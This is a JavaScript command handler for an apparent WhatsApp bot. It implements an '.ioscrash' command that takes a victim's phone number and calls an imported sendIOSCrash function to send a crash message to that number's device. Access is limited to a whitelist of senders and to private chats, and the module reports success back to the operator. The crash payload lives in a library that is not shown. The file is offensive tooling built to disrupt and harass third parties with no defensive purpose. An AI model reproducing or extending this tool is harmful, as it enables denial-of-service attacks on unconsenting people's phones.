const fs = require('fs');
const path = require('path');
const { sendIOSCrash } = require('../lib/bugfunctions');

// convert number → JID
function toJid(number) {
  return number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
}

// check whitelist
function isWhitelisted(senderNumber) {
  try {
    const whitelistPath = path.join(__dirname, '../whitelist.json');
    const whitelist = JSON.parse(fs.readFileSync(whitelistPath));

    return whitelist.includes(senderNumber);
  } catch (err) {
    console.error('Whitelist error:', err);
    return false;
  }
}

async function ioscrashCommand(sock, chatId, message) {
  try {
    // ❌ Block group usage
    const isGroup = chatId.endsWith('@g.us');
    if (isGroup) {
      return sock.sendMessage(chatId, {
        text: '❌ This command works only in private chat'
      }, { quoted: message });
    }

    // get message text
    const rawText =
      message.message?.conversation ||
      message.message?.extendedTextMessage?.text ||
      "";

    const args = rawText.trim().split(/\s+/);

    // get sender
    const sender =
      message.key.participant || message.key.remoteJid;

    const senderNumber = sender.split('@')[0];

    // ❌ whitelist check
    if (!isWhitelisted(senderNumber)) {
      return sock.sendMessage(chatId, {
        text: '❌ You are not whitelisted to use this command'
      }, { quoted: message });
    }

    // get target number
    const number = args[1];

    if (!number) {
      return sock.sendMessage(chatId, {
        text: '❌ Usage: .ioscrash 2547xxxxxxx'
      }, { quoted: message });
    }

    const target = toJid(number);

    await sock.sendMessage(chatId, {
      text: `📱 Sending iOS crash to ${number}...`
    }, { quoted: message });

    await sendIOSCrash(sock, target);

    await sock.sendMessage(chatId, {
      text: `✅ iOS crash sent to ${number}`
    }, { quoted: message });

  } catch (error) {
    console.error('iOS Crash Command Error:', error);

    await sock.sendMessage(chatId, {
      text: `❌ Error: ${error.message}`
    }, { quoted: message }).catch(() => {});
  }
}

module.exports = ioscrashCommand;
